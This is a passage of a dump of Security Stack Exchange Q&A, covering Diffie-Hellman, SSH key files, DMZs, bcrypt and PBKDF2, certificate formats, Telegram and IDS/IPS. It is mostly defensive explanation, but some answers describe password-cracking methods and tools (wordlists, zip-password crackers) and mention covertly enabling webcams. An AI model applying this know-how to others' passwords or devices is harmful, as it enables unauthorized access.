<li>I do the same thing, but we'll call my secret number <strong>b</strong> and the computed number <strong>B</strong>. So I compute <strong>g<sup>b</sup></strong> <em>mod</em> <strong>p</strong> and send you the result (called ""<strong>B</strong>"")</li>
<li>Now, you take the number I sent you and do the exact same operation with <em>it</em>. So that's <strong>B<sup>a</sup></strong> <em>mod</em> <strong>p</strong>. </li>
<li>I do the same operation with the result you sent me, so: <strong>A<sup>b</sup></strong> <em>mod</em> <strong>p</strong>.</li>
</ol>

<p>The ""magic"" here is that the answer I get at step 5 is <em>the same number</em> you got at step 4. Now it's not really magic, it's just math, and it comes down to a fancy property of modulo exponents. Specifically:</p>

<blockquote>
  <p><strong>(g<sup>a</sup></strong> <em>mod</em> <strong>p)<sup>b</sup></strong> <em>mod</em> <strong>p</strong> = <strong>g<sup>ab</sup></strong> <em>mod</em> <strong>p</strong><br>
  <strong>(g<sup>b</sup></strong> <em>mod</em> <strong>p)<sup>a</sup></strong> <em>mod</em> <strong>p</strong> = <strong>g<sup>ba</sup></strong> <em>mod</em> <strong>p</strong></p>
</blockquote>

<p>Which, if you examine closer, means that you'll get the same answer no matter which order you do the exponentiation in. So I do it in one order, and you do it in the other. I never know what secret number you used to get to the result and you never know what number I used, but we still arrive at the same result.</p>

<p>That result, that number we both stumbled upon in step 4 and 5, is our shared secret key. We can use that as our password for AES or Blowfish, or any other algorithm that uses shared secrets. And we can be certain that nobody else, nobody but us, knows the key that we created together.</p>
","45971"
"What is the difference between authorized_keys and known_hosts file for SSH?","208564","","<p>I am learning the basics of SSH protocol. I am confused between the contents of the following 2 files:</p>

<ol>
<li><p><code>~/.ssh/authorized_keys</code>: Holds a list of authorized public keys for servers. When the client connects to a server, the server authenticates the client by checking its signed public key stored within this file</p></li>
<li><p><code>~/.ssh/known_hosts</code>: Contains DSA host keys of SSH servers accessed by the user. This file is very important for ensuring that the SSH client is connecting the correct SSH server.</p></li>
</ol>

<p>I am not sure what this means. Please help. </p>
","<p>The <code>known_hosts</code> file lets the client authenticate the server, to check that it isn't connecting to an impersonator. The <code>authorized_keys</code> file lets the server authenticate the user.</p>

<h3>Server authentication</h3>

<p>One of the first things that happens when the SSH connection is being established is that the server sends its public key to the client, and proves (thanks to <a href=""http://en.wikipedia.org/wiki/Public-key_cryptography"">public-key cryptography</a>) to the client that it knows the associated private key. This authenticates the server: if this part of the protocol is successful, the client knows that the server is who it claims it is. </p>

<p>The client may check that the server is a known one, and not some rogue server trying to pass off as the right one. SSH provides only a simple mechanism to verify the server's legitimacy: it remembers servers you've already connected to, in the <code>~/.ssh/known_hosts</code> file on the client machine (there's also a system-wide file <code>/etc/ssh/known_hosts</code>). The first time you connect to a server, you need to check by some other means that the public key presented by the server is really the public key of the server you wanted to connect to. If you have the public key of the server you're about to connect to, you can add it to <code>~/.ssh/known_hosts</code> on the client manually.</p>

<p>By the way, <code>known_hosts</code> can contain any type of public key supported by the SSH implementation, not just DSA (also RSA and ECDSA).</p>

<p>Authenticating the server has to be done before you send any confidential data to it. In particular, if the user authentication involves a password, the password must not be sent to an unauthenticated server.</p>

<h3>User authentication</h3>

<p>The server only lets a remote user log in if that user can prove that they have the right to access that account. Depending on the server's configuration and the user's choice, the user may present one of several forms of credentials (the list below is not exhaustive).</p>

<ul>
<li>The user may present the password for the account that he is trying to log into; the server then verifies that the password is correct.</li>
<li>The user may present a public key and prove that he possesses the private key associated with that public key. This is exactly the same method that is used to authenticate the server, but now the user is trying to prove its identity and the server is verifying it. The login attempt is accepted if the user proves that he knows the private key and the public key is in the account's authorization list (<code>~/.ssh/authorized_keys</code> on the server).</li>
<li>Another type of method involves delegating part of the work of authenticating the user to the client machine. This happens in controlled environments such as enterprises, when many machines share the same accounts. The server authenticates the client machine by the same mechanism that is used the other way round, then relies on the client to authenticate the user.</li>
</ul>
","20710"
"How to detect if files were saved or copied to a USB drive?","207628","","<p>How can I find out if files from my computer were written/copied/moved to a USB storage device? I want to know if there is a solution that would work in a system that has not got any monitoring/logging of USB activity explicitly enabled and after the files have already been written.</p>

<p>I have already used software which would reads the information from registry location </p>

<blockquote>
  <p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR</p>
</blockquote>

<p>But it just tells the vendor name, time connected and other artifacts.</p>
","<p>This will depend entirely on what logging you have enabled. It it's easy after the event to tell you to log all file copies etc, but if you weren't logging it, you won't be able to retrieve that info. </p>
","23281"
"Wordlists on Kali Linux?","205090","","<p>I notice that in <code>/usr/share/wordlists</code> in Kali Linux (former Backtrack) there are some lists. Are they used to bruteforce something? Is there specific list for specific kind of attacks?</p>
","<p>Kali linux is a distribution designed for penetration testing and computer forensics, both which involve password cracking. So you are right in thinking that word lists are involved in password cracking, however it's not brute force. </p>

<p>Brute force attacks try every combination of characters in order to find a password, while word lists are used in dictionary based attacks. Many people base their password on dictionary words, and word lists are used to supply the material for dictionary attacks. The reason you want to use dictionary attacks is that they are much faster than brute force attacks. If you have many passwords and you only want to crack one or two then this method can yield quick results, especially if the password hashes are from places where strong passwords are not enforced. </p>

<p>Typical tools for password cracking (John the Ripper, ophtcrack, hashcat, etc) can do several types of attacks including:</p>

<ul>
<li>Standard brute force: all combinations are tried until something matches. You tpyically use a character set common on the keyboards of the language used to type the passwords, or you can used a reduced set like alphanumneric plus a few symbols. the size of the character set makes a big difference in how long it takes to brute force a password. Password length also makes a big difference. This can take a very long time depending on many factors</li>
<li>Standard dictionary: straight dictionary words are used. It's mostly used to find really poor passwords, like password, password123, system, welcome, 123456, etc. </li>
<li>Dictionary attack with rules: in this type dictionary words are used as the basis for cracks, rules are used to modify these, for instance capitalizing the first letter, adding a number to the end, or replacing letters with numbers or symbols</li>
</ul>

<p>Rules attacks are likely the best bang for the buck if all you have are standard computing resources, although if you have GPUs available brute-force attacks can be made viable as long as the passwords aren't too long. It depends on the password length, hashing/salting used, and how much computing power you have at your disposal. </p>
","45852"
"What is the real function and use of a DMZ on a network?","201831","","<p>I read the article on Wikipedia describing what a <a href=""http://en.wikipedia.org/wiki/DMZ_%28computing%29"">DMZ (demilitarized zone) is</a> on a network, but am still failing to grasp both how it is set up (ie: is it within the main network or sequestered away?) and what its benefits and uses are. Can anyone explain to me why I'd like to have a DMZ on my network, given the following setup:</p>

<ol>
<li>I have around 10 client computer devices on the network, some of which host SSH.</li>
<li>I have a single server which hosts SSH, HTTP, and a few other publicly accessible services.</li>
</ol>

<p>For this given use-case, how would I plug in a DMZ, and what would be the benefits?</p>
","<p>Reasons why you want a DMZ and the benefits it offers.
The general idea is that you put your public faced servers in the ""DMZ network"" so that you can separate them from your private, <em>trusted</em> network.
The use case is that because your server has a public face, it can be remotely rooted. If that happens, and a malicious party gains access to your server, he should be <em>isolated in the DMZ network</em> and not have direct access to the private hosts (or to a database server for example that would be inside the private network and not on the DMZ).</p>

<p>How to do it:
There are several ways, but the 'book example' is by utilizing two firewalls (of course you can achieve the same result with one firewall and smart configuration, although hardware isolation is nicer). Your main firewall is between internet and the server and the second firewall between the server and the private network. On this second firewall, all access from the server to the private network ideally would be forbiden (of course it would be a statefull firewall so if you initiate a connection from the private network to the server it would work).</p>

<p>So, this is a fairly high level overview of DMZ. If you want more technical details please edit your question accordingly.</p>
","3673"
"How does Amazon bill me without the CVC / CVV / CVV2?","201355","","<p>The card in question is a VISA, if that's of any importance. I've noticed this only on Amazon. All other sites I've purchased something from, <strong>ever</strong>, have needed the CVC code for the card. However, I know I never entered the CVC on Amazon when I added my card to it, and this has been bugging me ever since. How do they successfully charge the card without the CVC code?</p>
","<p>That code isn't necessary. This may cause more fraud and more chargebacks, but Amazon keeps those numbers low so that they can offer a faster shopping experience such as one-click.</p>

<p>The only thing necessary to make a purchase is the card number, whether in number form or magnetic. You don't even need the expiration date. Most systems require more information (such as matching full name, bank phone number, physical billing address with zip code, et al) so that they can deal with fraud and/or chargebacks, and sometimes this is enforced by the issuing bank.</p>
","21172"
"Do any security experts recommend bcrypt for password storage?","198381","","<p>On the surface bcrypt, an 11 year old security algorithm designed for hashing passwords by <a href=""http://en.wikipedia.org/wiki/Niels_Provos"">Niels Provos</a> and David Mazieres, which is based on the initialization function used in the NIST approved blowfish algorithm seems almost too good to be true. It is not vulnerable to rainbow tables (since creating them is too expensive) and not even vulnerable to brute force attacks.</p>

<p>However 11 years later, many are still using SHA2x with salt for storing password hashes and bcrypt is not widely adopted. </p>

<ul>
<li>What is the NIST recommendation with regards to bcrypt (and password hashing in general)? </li>
<li>What do prominent security experts (such as Arjen Lenstra and so on) say about using bcrypt for password hashing?    </li>
</ul>
","<p><a href=""http://en.wikipedia.org/wiki/Bcrypt"" rel=""noreferrer"">Bcrypt</a> has the best kind of repute that can be achieved for a cryptographic algorithm: it has been around for quite some time, used quite widely, ""attracted attention"", and yet remains unbroken to date.</p>

<p><strong>Why bcrypt is somewhat better than PBKDF2</strong></p>

<p>If you look at the situation in details, you can actually see some points where bcrypt is better than, say, <a href=""http://en.wikipedia.org/wiki/PBKDF2"" rel=""noreferrer"">PBKDF2</a>. Bcrypt is a password hashing function which aims at being slow. To be precise, we want the password hashing function to be as slow as possible <em>for the attacker</em> while not being intolerably slow <em>for the honest systems</em>. Since ""honest systems"" tend to use off-the-shelf generic hardware (i.e. ""a PC"") which are also available to the attacker, the best that we can hope for is to make password hashing <em>N</em> times slower for both the attacker and for us. We then adjust <em>N</em> so as not to exceed our resources (foremost of which being the user's patience, which is really limited).</p>

<p>What we want to avoid is that an attacker might use some non-PC hardware which would allow him to suffer less than us from the extra work implied by bcrypt or PBKDF2. In particular, an industrious attacker may want to use a <a href=""http://en.wikipedia.org/wiki/GPU"" rel=""noreferrer"">GPU</a> or a <a href=""http://en.wikipedia.org/wiki/FPGA"" rel=""noreferrer"">FPGA</a>. SHA-256, for instance, can be very efficiently implemented on a GPU, since it uses only 32-bit logic and arithmetic operations that GPU are very good at. Hence, an attacker with 500$ worth of GPU will be able to ""try"" many more passwords per hour than what he could do with 500$ worth of PC (the ratio depends on the type of GPU, but a 10x or 20x ratio would be typical).</p>

<p>Bcrypt happens to heavily rely on accesses to a table which is constantly altered throughout the algorithm execution. This is very fast on a PC, much less so on a GPU, where memory is shared and all cores compete for control of the internal memory bus. Thus, the boost that an attacker can get from using GPU is quite reduced, compared to what the attacker gets with PBKDF2 or similar designs.</p>

<p>The designers of bcrypt were quite aware of the issue, which is why they designed bcrypt out of the block cipher <a href=""http://en.wikipedia.org/wiki/Blowfish_%28cipher%29"" rel=""noreferrer"">Blowfish</a> and not a SHA-* function. They note in <a href=""http://www.usenix.org/events/usenix99/provos/provos_html/node1.html"" rel=""noreferrer"">their article</a> the following:</p>

<blockquote>
  <p>That means one should make any password function as efficient as possible for the setting in which it will operate. The designers of crypt failed to do this. They based crypt on DES, a particularly inefficient algorithm to implement in software because of many bit transpositions. They discounted hardware attacks, in part because crypt cannot be calculated with stock DES hardware. Unfortunately, Biham later discovered a software technique known as bitslicing that eliminates the cost of bit transpositions in computing many simultaneous DES encryptions. While bitslicing won't help anyone log in faster, it offers a staggering speedup to brute force password searches.</p>
</blockquote>

<p>which shows that the hardware <em>and</em> the way it can be used is important. Even with the same PC as the honest system, an attacker can use bitslicing to try several passwords in parallel and get a boost out of it, because the attacker <em>has</em> several passwords to try, while the honest system has only one at a time.</p>

<p><strong>Why bcrypt is not optimally secure</strong></p>

<p>The bcrypt authors were working in 1999. At that time, the threat was custom <a href=""http://en.wikipedia.org/wiki/ASIC"" rel=""noreferrer"">ASIC</a> with very low gate counts. Times have changed; now, the sophisticated attacker will use big FPGA, and the newer models (e.g. the Virtex from Xilinx) have embedded RAM blocks, which allow them to implement Blowfish and bcrypt very efficiently. Bcrypt needs only 4 kB of fast RAM. While bcrypt does a decent job at making life difficult for a GPU-enhanced attacker, it does little against a FPGA-wielding attacker.</p>

<p>This prompted Colin Percival to invent <a href=""http://www.tarsnap.com/scrypt.html"" rel=""noreferrer"">scrypt</a> in 2009; this is a bcrypt-like function which requires much more RAM. This is still a new design (only two years) and nowhere nearly as widespread as bcrypt; I deem it too new to be recommended on a general basis. But its career should be followed.</p>

<p>(<strong>Edit:</strong> scrypt turned out to not to fully live up to its promises. Basically, it is good for what it was designed to do, i.e. protect the encryption key for the main hard disk of a computer: this is a usage context where the hashing can use hundreds of megabytes of RAM and several seconds worth of CPU. For a busy server that authenticates incoming requests, the CPU budget is much lower, because the server needs to be able to serve several concurrent requests at once, and not slow down to a crawl under occasional peak loads; but when scrypt uses less CPU, it also uses less RAM, this is part of how the function is internally defined. When the hash computation must complete within a few milliseconds of work, the used RAM amount is so low that scrypt becomes, technically, weaker than bcrypt.)</p>

<p><strong>What NIST recommends</strong></p>

<p>NIST has issued <a href=""http://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-132.pdf"" rel=""noreferrer"">Special Publication SP 800-132</a> on the subject of storing hashed passwords. Basically they recommend PBKDF2. This does not mean that they deem bcrypt insecure; they say nothing at all about bcrypt. It just means that NIST deems PBKDF2 ""secure enough"" (and it certainly <em>is</em> much better than a simple hash !). Also, NIST is an administrative organization, so they are bound to just love anything which builds on already ""Approved"" algorithms like SHA-256. On the other hand, bcrypt comes from Blowfish which has never received any kind of NIST blessing (or curse).</p>

<p>While I recommend bcrypt, I still follow NIST in that if you implement PBKDF2 and use it properly (with a ""high"" iteration count), then it is quite probable that password storage is no longer the worst of your security issues.</p>
","6415"
"Difference between .pfx and .cert certificates","193478","","<p>What is the difference between <code>.pfx</code> and <code>.cert</code> certificate files?</p>

<p>Do we distribute <code>.pfx</code> or <code>.cert</code> for client authentication?</p>
","<p>There are two objects: the <em>private key</em>, which is what the server owns, keeps secret, and uses to receive new SSL connections; and the <em>public key</em> which is mathematically linked to the private key, and made ""public"": it is sent to every client as part of the initial steps of the connection.</p>

<p>The <a href=""http://en.wikipedia.org/wiki/Public_key_certificate""><em>certificate</em></a> is, nominally, a container for the public key. It includes the public key, the server name, some extra information about the server, and a signature computed by a <em>certification authority</em> (CA). When the server sends its public key to a client, it actually sends its certificate, with a few other certificates (the certificate which contains the public key of the CA which signed its certificate, and the certificate for the CA which signed the CA's certificate, and so on). Certificates are intrinsically public objects.</p>

<p>Some people use the term ""certificate"" to designate both the certificate and the private key; this is a common source of confusion. I personally stick to the strict definition for which the certificate is the signed container for the public key only.</p>

<p>A <code>.pfx</code> file is a <a href=""http://en.wikipedia.org/wiki/PKCS_12"">PKCS#12 archive</a>: a bag which can contain a lot of objects with optional password protection; but, usually, a PKCS#12 archive contains a certificate (possibly with its assorted set of CA certificates) <em>and</em> the corresponding private key.</p>

<p>On the other hand, a <code>.cert</code> (or <code>.cer</code> or <code>.crt</code>) file usually contains a single certificate, alone and without any wrapping (no private key, no password protection, just the certificate).</p>
","29428"
"Is Telegram secure?","191041","","<p>There is a new <em>WhatsApp-killer</em> application called <strong>Telegram</strong>. They said that it's <a href=""https://telegram.org/source"">open source</a> and that it has a more <a href=""https://telegram.org/crypto_contest"">secure encryption</a>.</p>

<p>But they <a href=""https://telegram.org/faq#q-why-not-just-make-all-chats-secret"">store all the messages</a> in their servers and <a href=""http://www.whatsapp.com/faq/en/general/21864047"">WhatsApp doesn't store</a> any messages in any server, only a local copy in the phones.</p>

<p>Is <a href=""https://telegram.org/"">Telegram</a> more secure than <a href=""http://www.whatsapp.com"">WhatsApp</a>?</p>
","<h2>TL;DR: No, <a href=""https://eprint.iacr.org/2015/1177.pdf"" rel=""nofollow noreferrer"">Telegram is not secure</a>.</h2>

<p>I'd like to ignore the comparison to WhatsApp because WhatsApp does not advertise itself as a ""secure"" messaging option. I'd like to instead focus on whether Telegram is secure.</p>

<p>Telegram's security is built around their home spun <a href=""https://core.telegram.org/mtproto"" rel=""nofollow noreferrer"">MTProto</a> protocol. We all know that the first rule of Cryptography is <a href=""https://security.stackexchange.com/q/25585/10211"">Don't Roll Your Own Crypto</a>. <em>Especially</em> if you aren't trained cryptographers. Which the Telegram people most certainly aren't.</p>

<blockquote>
  <p>The team behind Telegram, led by Nikolai Durov, consists of six ACM champions, half of them Ph.Ds in math. It took them about two years to roll out the current version of MTProto. Names and degrees may indeed not mean as much in some fields as they do in others, but this protocol is the result of thougtful and prolonged work of professionals.</p>
</blockquote>

<p>Source: <a href=""https://news.ycombinator.com/item?id=6916860"" rel=""nofollow noreferrer"">https://news.ycombinator.com/item?id=6916860</a></p>

<p>Math Ph.Ds are <strong>not</strong> cryptographers. The protocol they invented is flawed. <a href=""http://unhandledexpression.com/2013/12/17/telegram-stand-back-we-know-maths/"" rel=""nofollow noreferrer"">Here</a> is a nice blog post explaining why. In addition to that, Telegram has issued a rather ridiculous challenge offering a reward to anyone who can break the protocol. Except that the terms they set makes even the most ridiculously weak protocol difficult to break. Moxie Marlinspike has a nice <a href=""http://thoughtcrime.org/blog/telegram-crypto-challenge/"" rel=""nofollow noreferrer"">blog post</a> explaining why the challenge is ridiculous.</p>

<p>So, no. Telegram is by no means secure. For commonly accepted definitions of secure, not the one Telegram made up.</p>

<p>If you want a <em>real</em> secure means of communication on your phone, look to more reputable projects such as <a href=""https://signal.org/"" rel=""nofollow noreferrer"">Signal</a> or <a href=""https://www.whatsapp.com/"" rel=""nofollow noreferrer"">WhatsApp</a> (which, since this answer was first written, now uses the Signal Protocol for end-to-end message encryption).</p>

<p><strong>UPDATE</strong></p>

<ul>
<li>09 January 2015: A new <a href=""http://www.alexrad.me/discourse/a-264-attack-on-telegram-and-why-a-super-villain-doesnt-need-it-to-read-your-telegram-chats.html"" rel=""nofollow noreferrer"">2^64 attack</a> On Telegram has been
announced. </li>
<li>12 December 2015: A <a href=""https://eprint.iacr.org/2015/1177.pdf"" rel=""nofollow noreferrer"">new paper</a> demonstrating that
MTProto is not IND-CCA secure.</li>
<li>22 December 2017: Replaced outdated recommendation for
CryptoCat with a more up-to-date recommendation for
Signal and WhatsApp.</li>
</ul>
","49802"
"How to recover a lost zip file password","185552","","<p>I have some files I was given by my teacher at University, I could chase him up, but I may as well try getting blood from a stone, his response rate isn't great and I completed my degree a year ago!</p>

<p>They're pdf files stored inside password protected zip files. The passwords are networking related, have upper and lowercase and numbers, but no special characters as far as I remember, and some are permutations of each other ""passwordL1"", ""l2Password"" etc.</p>

<p>What are the different encryption algorithms employed by .zip files? </p>

<p>How can I determine the protection in use on my zip files?</p>

<p>Where can I find good papers and tools, which will ultimately give me back the pdfs which are annoyingly hidden by the password?</p>
","<p>If you haven't already looked at it there's a couple of sources I'd recommend for this.</p>

<ul>
<li><p><a href=""http://www.openwall.com/john/"">John the ripper</a> with the community jumbo patch supports zip cracking.  If you look at the supported modes there's some options (including the basic brute-force) for cracking zip passwords.</p></li>
<li><p><a href=""http://elcomsoft.com/archpr.html"">Elcomsoft</a> have good zip crackers including guaranteed recovery under some circumstances</p></li>
<li><p>There are also some companies <a href=""http://www.parallelrecovery.com/zip-password.html"">like this one</a> who appear to have GPU accelerated zip cracking, which could speed things up depending on your hardware.</p></li>
</ul>

<p>In terms of the approach it sounds like a dictionary based attack with mutation rules(so changing the dictionary with things like leet speak rules) would be the best bet, particularly if you've got the idea that the words would come from a specific domain.  Straight brute-force would likely not be a good idea as it tends to top out around 8 characters (unless you're throwing a lot of CPU/GPU power at it)</p>
","17797"
"Can webcams be turned on without the indicator light?","182887","","<p>I've made a series of penetration tests in my network and one of the things I've tried was to record webcam and microphone.</p>

<p>Recording an end-user's microphone seems to be a stealth thing, but what about the webcam?
In my tests, the indicator is turned on and I can't figure out a way to do this without turning on the light.</p>

<p>So far, I'm assuming that if someone broke into my computer and turned on the webcam, I'll know that.</p>

<p>But, if that's possible, which of the available hardwares on the market are vulnerable to that kind of attack?</p>
","<p>Most definitely,  but in order to do this you would probably have to patch the camera's firmware and then flash it.   Similar attacks have been used to disable the ""shutter sound"" on cameras. </p>
","6763"
"Difference between IDS and IPS and Firewall","172741","","<p>The differences between an IDS and a firewall are that the latter prevents malicious traffic, whereas the IDS:</p>

<ul>
<li>Passive IDS: the IDS only reports that there was an intrusion.</li>
<li>Active IDS: the IDS also takes actions against the issue to fix it or at least lessen its impact.</li>
</ul>

<p>However, what's the difference between an IPS and a Firewall? Both are a preventative technical control whose purpose is to guarantee that incoming network traffic is legitimate.</p>
","<p>The line is definitely blurring somewhat as technological capacity increases, platforms are integrated, and the threat landscape shifts. At their core we have</p>

<ul>
<li><strong>Firewall</strong> - A device or application that analyzes packet headers and enforces policy based on protocol type, source address, destination address, source port, and/or destination port. Packets that do not match policy are rejected.</li>
<li><strong>Intrusion Detection System</strong> - A device or application that analyzes whole packets, both header and payload, looking for known events. When a known event is detected a log message is generated detailing the event.</li>
<li><strong>Intrusion Prevention System</strong> - A device or application that analyzes whole packets, both header and payload, looking for known events. When a known event is detected the packet is rejected.</li>
</ul>

<p>The functional difference between an IDS and an IPS is a fairly subtle one and is often nothing more than a configuration setting change. For example, in a Juniper IDP module, changing from Detection to Prevention is as easy as changing a drop-down selection from LOG to LOG/DROP. At a technical level it can sometimes require redesign of your monitoring architecture.</p>

<p>Given the similarity between all three systems there has been some convergence over time. The Juniper IDP module mentioned above, for example, is effectively an add-on component to a firewall. From a network flow and administrative perspective the firewall and IDP are functionally indistinguishable even if they are technically two separate devices.</p>

<p>There is also much market discussion of something called a Next Generation Firewall (NGFW). The concept is still new enough that each vendor has their own definition as to what constitutes a NGFW but for the most part all agree that it is a device that enforces policy unilaterally across more than just network packet header information. This can make a single device act as both a traditional Firewall and IPS. Occasionally additional information is gathered, such as from which user the traffic originated, allowing even more comprehensive policy enforcement.</p>
","45045"
"How to securely hash passwords?","172676","","<p>If I hash passwords before storing them in my database, is that sufficient to prevent them being recovered by anyone?</p>

<p>I should point out that this relates only to retrieval directly from the database, and not any other type of attack, such as bruteforcing the login page of the application, keylogger on the client, and of course <a href=""https://xkcd.com/538/"">rubberhose cryptanalysis</a> (or nowadays we should call it ""<a href=""http://www.theregister.co.uk/2007/04/17/chocolate_password_survey/"">Chocolate Cryptanalysis</a>"").</p>

<p><strong>Of course any form of hash will not prevent those attacks.</strong></p>
","<h1><strong>The Theory</strong></h1>

<p>We need to hash passwords as a second line of defence. A server which can authenticate users necessarily contains, somewhere in its entrails, some data which can be used to <em>validate</em> a password. A very simple system would just store the passwords themselves, and validation would be a simple comparison. But if a hostile outsider were to gain a simple glimpse at the contents of the file or database table which contains the passwords, then that attacker would learn a lot. Unfortunately, such partial, read-only breaches do occur in practice (a mislaid backup tape, a decommissioned but not wiped-out hard disk, an aftermath of a SQL injection attack -- the possibilities are numerous). See <a href=""http://security.blogoverflow.com/2011/11/why-passwords-should-be-hashed/"" rel=""noreferrer"">this blog post</a> for a detailed discussion.</p>

<p>Since the overall contents of a server that can validate passwords are necessarily sufficient to indeed validate passwords, an attacker who obtained a read-only snapshot of the server is in position to make an <a href=""http://en.wikipedia.org/wiki/Dictionary_attack"" rel=""noreferrer"">offline dictionary attack</a>: he tries potential passwords until a match is found. This is unavoidable. So we want to make that kind of attack as hard as possible. Our tools are the following:</p>

<ul>
<li><p><a href=""http://en.wikipedia.org/wiki/Cryptographic_hash_function"" rel=""noreferrer""><strong>Cryptographic hash functions</strong></a>: these are fascinating mathematical objects which everybody can compute efficiently, and yet nobody knows how to invert them. This looks good for our problem - the server could store a <em>hash</em> of a password; when presented with a putative password, the server just has to hash it to see if it gets the same value; and yet, knowing the hash does not reveal the password itself.</p></li>
<li><p><strong>Salts</strong>: among the advantages of the attacker over the defender is <em>parallelism</em>. The attacker usually grabs a whole list of hashed passwords, and is interested in breaking as many of them as possible. He may try to attack several in parallels. For instance, the attacker may consider one potential password, hash it, and then compare the value with 100 hashed passwords; this means that the attacker <em>shares the cost</em> of hashing over several attacked passwords. A similar optimisation is <em>precomputed tables</em>, including <a href=""http://en.wikipedia.org/wiki/Rainbow_table"" rel=""noreferrer"">rainbow tables</a>; this is still parallelism, with a space-time change of coordinates.</p>

<p>The common characteristic of all attacks which use parallelism is that they work over several passwords which were processed with the <em>exact same hash function</em>. <strong>Salting</strong> is about using not <em>one</em> hash function, but <em>a lot of distinct hash functions</em>; ideally, each instance of password hashing should use its own hash function. A <em>salt</em> is a way to select a specific hash function among a big family of hash functions. Properly applied salts will completely thwart parallel attacks (including rainbow tables).</p></li>
<li><p><strong>Slowness</strong>: computers become faster over time (Gordon Moore, co-founder of Intel, theorized it in his famous <a href=""http://en.wikipedia.org/wiki/Moore%27s_law"" rel=""noreferrer"">law</a>). Human brains do not. This means that attackers can ""try"" more and more potential passwords as years pass, while users cannot remember more and more complex passwords (or flatly refuse to). To counter that trend, we can make hashing <em>inherently slow</em> by defining the hash function to use a lot of internal iterations (thousands, possibly millions).</p></li>
</ul>

<p>We have a few standard cryptographic hash functions; the most famous are <a href=""http://en.wikipedia.org/wiki/MD5"" rel=""noreferrer"">MD5</a> and the <a href=""http://en.wikipedia.org/wiki/Secure_Hash_Algorithm"" rel=""noreferrer"">SHA family</a>. Building a secure hash function out of elementary operations is far from easy. When cryptographers want to do that, they think hard, then harder, and organize a tournament where the functions fight each other fiercely. When hundreds of cryptographers gnawed and scraped and punched at a function for several years and found nothing bad to say about it, then they begin to admit that maybe that specific function could be considered as more or less secure. This is just what happened in the <a href=""http://en.wikipedia.org/wiki/NIST_hash_function_competition"" rel=""noreferrer"">SHA-3 competition</a>. We <em>have</em> to use this way of designing hash function because we know no better way. Mathematically, we do not know if secure hash functions actually exist; we just have ""candidates"" (that's the difference between ""it cannot be broken"" and ""nobody in the world knows how to break it"").</p>

<p>A basic hash function, even if secure <em>as a hash function</em>, is not appropriate for password hashing, because:</p>

<ul>
<li>it is unsalted, allowing for parallel attacks (<a href=""http://www.freerainbowtables.com/tables/"" rel=""noreferrer"">rainbow tables for MD5 or SHA-1</a> can be obtained for free, you do not even need to recompute them yourself);</li>
<li>it is way too fast, and gets faster with technological advances. With a recent GPU (i.e. off-the-shelf consumer product which everybody can buy), hashing rate is counted in <a href=""http://www.golubev.com/hashgpu.htm"" rel=""noreferrer"">billions of passwords per second</a>.</li>
</ul>

<p>So we need something better. It so happens that slapping together a hash function and a salt, and iterating it, is not easier to do than designing a hash function -- at least, if you want the result to be secure. There again, you have to rely on standard constructions which have survived the continuous onslaught of vindicative cryptographers.</p>

<h1><strong>Good Password Hashing Functions</strong></h1>

<h2>PBKDF2</h2>

<p><a href=""http://en.wikipedia.org/wiki/PBKDF2"" rel=""noreferrer"">PBKDF2</a> comes from <a href=""http://tools.ietf.org/html/rfc2898"" rel=""noreferrer"">PKCS#5</a>. It is parameterized with an iteration count (an integer, at least 1, no upper limit), a salt (an arbitrary sequence of bytes, no constraint on length), a required output length (PBKDF2 can generate an output of configurable length), and an ""underlying PRF"". In practice, PBKDF2 is always used with <a href=""http://en.wikipedia.org/wiki/Hash-based_message_authentication_code"" rel=""noreferrer"">HMAC</a>, which is itself a construction built over an underlying hash function. So when we say ""PBKDF2 with SHA-1"", we actually mean ""PBKDF2 with HMAC with SHA-1"".</p>

<p>Advantages of PBKDF2:</p>

<ul>
<li>Has been specified for a long time, seems unscathed for now.</li>
<li>Is already implemented in various framework (e.g. it is provided with <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.rfc2898derivebytes.aspx"" rel=""noreferrer"">.NET</a>).</li>
<li>Highly configurable (although some implementations do not let you choose the hash function, e.g. the one in .NET is for SHA-1 only).</li>
<li>Received <a href=""http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf"" rel=""noreferrer"">NIST blessings</a> (modulo the difference between hashing and key derivation; see later on).</li>
<li>Configurable output length (again, see later on).</li>
</ul>

<p>Drawbacks of PBKDF2:</p>

<ul>
<li>CPU-intensive only, thus amenable to high optimization with GPU (the defender is a basic server which does generic things, i.e. a PC, but the attacker can spend his budget on more specialized hardware, which will give him an edge).</li>
<li>You still have to manage the parameters yourself (salt generation and storage, iteration count encoding...). There is a <a href=""http://tools.ietf.org/html/rfc2898#appendix-A.2"" rel=""noreferrer"">standard encoding for PBKDF2 parameters</a> but it uses ASN.1 so most people will avoid it if they can (ASN.1 can be tricky to handle for the non-expert).</li>
</ul>

<h2>bcrypt</h2>

<p><a href=""http://en.wikipedia.org/wiki/Bcrypt"" rel=""noreferrer"">bcrypt</a> was designed by reusing and expanding elements of a block cipher called <a href=""http://en.wikipedia.org/wiki/Blowfish_%28cipher%29"" rel=""noreferrer"">Blowfish</a>. The iteration count is a power of two, which is a tad less configurable than PBKDF2, but sufficiently so nevertheless. This is the core password hashing mechanism in the <a href=""http://www.openbsd.org/"" rel=""noreferrer"">OpenBSD</a> operating system. </p>

<p>Advantages of bcrypt:</p>

<ul>
<li>Many available implementations in various languages (see the links at the end of the Wikipedia page).</li>
<li>More resilient to GPU; this is due to details of its internal design. The bcrypt authors made it so voluntarily: they reused Blowfish because Blowfish was based on an internal RAM table which is constantly accessed and modified throughout the processing. This makes life much harder for whoever wants to speed up bcrypt with a GPU (GPU are not good at making a lot of memory accesses in parallel). See <a href=""https://security.stackexchange.com/questions/4781/do-any-security-experts-recommend-bcrypt-for-password-storage/6415#6415"">here</a> for some discussion.</li>
<li>Standard output encoding which includes the salt, the iteration count and the output as one simple to store character string of printable characters.</li>
</ul>

<p>Drawbacks of bcrypt:</p>

<ul>
<li>Output size is fixed: 192 bits.</li>
<li>While bcrypt is good at thwarting GPU, it can still be thoroughly optimized with <a href=""http://en.wikipedia.org/wiki/Field-programmable_gate_array"" rel=""noreferrer"">FPGA</a>: modern FPGA chips have a lot of small embedded RAM blocks which are very convenient for running many bcrypt implementations in parallel within one chip. <a href=""http://openwall.info/wiki/john/FPGA"" rel=""noreferrer"">It has been done.</a></li>
